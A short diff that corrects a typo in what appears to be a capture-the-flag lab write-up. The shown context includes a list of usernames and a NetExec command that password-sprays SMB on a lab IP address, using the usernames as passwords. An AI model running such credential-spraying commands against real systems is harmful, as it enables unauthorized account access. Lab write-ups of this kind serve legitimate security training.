@@ -125,7 +125,7 @@ dgalanos
 roleary
 smorgan
 ```
-And then user the list usernames.txt to carry out a password spraying attack using NetExec:
+And then use the list usernames.txt to carry out a password spraying attack using NetExec:
 ```shell
 nxc smb 10.129.228.111 -u usernames.txt -p usernames.txt --continue-on-success
 ```
